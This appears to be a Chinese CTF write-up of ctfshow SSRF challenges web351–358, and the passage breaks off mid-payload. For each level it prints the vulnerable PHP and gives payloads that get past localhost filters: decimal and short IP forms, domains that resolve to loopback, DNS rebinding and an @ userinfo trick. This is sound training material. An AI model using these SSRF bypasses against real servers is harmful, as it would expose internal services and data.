    <content type="html"><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p><strong>SSRF攻击点</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li>curl_init(): 初始curl会话</li><li>curl_setopt(): 会话设置</li><li>curl_exec(): 执行curl会话，获取内容</li><li>curl_close(): 会话关闭</li></ul><p><strong>gopher协议</strong><br>通过gopher协议，将请求体用url编码后加上任意字符，一般是下划线，接上gopher的url即可执行GET、POST请求</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gopher:<span class="hljs-regexp">//i</span>p:port/_[stream]<br></code></pre></td></tr></table></figure><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>先进入flag.php看看<br><img src="/images/RQX4YD2YL8KI0N1X.png"><br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到代码中有个正则匹配，但它并没有参数<br><a href="https://www.php.net/manual/zh/function.parse-url.php">parse_url()</a>函数解析 URL 并返回关联数组，包含在 URL 中出现的各种组成部分。数组的元素值不会 URL 解码。<br><strong>示例</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;?php<br>$url = &#x27;http:<span class="hljs-comment">//username:password@hostname:9090/path?arg=value#anchor&#x27;;</span><br><br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_SCHEME)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_USER)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_PASS)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_HOST)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_PORT)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_PATH)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_QUERY)</span>);<br>var<span class="hljs-constructor">_dump(<span class="hljs-params">parse_url</span>($<span class="hljs-params">url</span>, PHP_URL_FRAGMENT)</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>以上示例会输出</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span></span> &#123;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;scheme&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;host&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;hostname&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;port&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">int</span>(<span class="hljs-number">9090</span>)<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;user&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;username&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;pass&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;password&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;path&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;/path&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;query&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;arg=value&quot;</span><br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;fragment&quot;</span>]</span>=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;anchor&quot;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span> <span class="hljs-string">&quot;http&quot;</span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span></span> <span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span></span> <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span></span> <span class="hljs-string">&quot;hostname&quot;</span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">9090</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span> <span class="hljs-string">&quot;/path&quot;</span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">9</span>)</span></span> <span class="hljs-string">&quot;arg=value&quot;</span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">6</span>)</span></span> <span class="hljs-string">&quot;anchor&quot;</span><br></code></pre></td></tr></table></figure><p>最上面两个if感觉在本题都没什么作用<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br></code></pre></td></tr></table></figure><p>根据parse_url()函数的解析，这题还有各种姿势获得flag</p><ul><li>127.1会被解析成127.0.0.1，也就意味着为零可缺省</li><li>在Linux中，0也会被解析成127.0.0.1</li><li>127.0.0.0&#x2F;8是一个环回地址网段，从127.0.0.1 ~ 127.255.255.254都表示localhost</li><li>ip地址还可以通过表示成其他进制的形式访问，<a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">IP地址二进制、十进制、十六进制互换</a></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.1</span>/flag.php<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/flag.php<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.255</span>.<span class="hljs-number">255.254</span>/flag.php<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这题正则加了url参数<br>代表这我们不能直接127.0.0.1&#x2F;flag.php输入了<br>但是我们可以和上题一样把127.0.0.1转换为十进制<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>可恶啊😡，竟然过滤了0和1，这代表着上面的方法都不能用了<br>直接搜索指向127.0.0.1的域名,直接拿来套着用<br><a href="https://www.maoyingdong.com/domain_to_localhost/">传送门</a></p><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span>localtest.me/flag.php<br></code></pre></td></tr></table></figure><h2 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">5</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>host 长度小于等于5<br>用前面的办法即可<br>payload:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">url</span><span class="hljs-operator">=</span><span class="hljs-number">127.1</span>/flag.php<br><span class="hljs-attribute">url</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><p>不贴代码了，同上，本题host len小于等于3<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ip!&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;scheme&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这题有两种解法——302跳转和dns重绑定<br>但是本题题解只放一种(还没搞懂VPS🥶)<br>网址送上<br><a href="http://ceye.io/">dns重绑定</a><br>dns rebinding里第一个域名随意，第二个域名为自己的<br><img src="/images/24J67YGL9HRBAI7BZTD.png"><br>把域名换为identifier里的内容,域名前面要加r.<br>需要多试几次<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span>r.****/flag.php<br><br></code></pre></td></tr></table></figure><p><img src="/images/fc053d981de7ffd57c75c9d588a89a21.png"></p><h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/xhmerry/article/details/1550928#:~:text=%3A%20%E5%8C%B9%E9%85%8D%E5%89%8D%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E5%87%BA%E7%8E%B0%200%20%E6%AC%A1%E6%88%96%201%20%E6%AC%A1%E3%80%82%20%2B%20%3A,%E6%81%B0%E5%B7%A7%E5%87%BA%E7%8E%B0%20n%20%E6%AC%A1%E3%80%82%20%7Bn%2C%7D%20%3A%20%E5%A4%A7%E4%BA%8E%E7%AD%89%E4%BA%8E%20n%20%E6%AC%A1%E3%80%82">正则表达式字符</a></p><ul><li><p>^：匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘&#x2F;n’ 或 ‘&#x2F;r’ 之后的位置。</p></li><li><p>$ ：匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘&#x2F;n’ 或 ‘&#x2F;r’ 之前的位置。</p></li><li><p>&#x2F;..* ：匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</p></li></ul><p>所以，正则表达式表明以<code>http://ctf.</code>开始，以show结尾</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span>ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php?show<br>or<br>url=http:<span class="hljs-regexp">//</span>ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<span 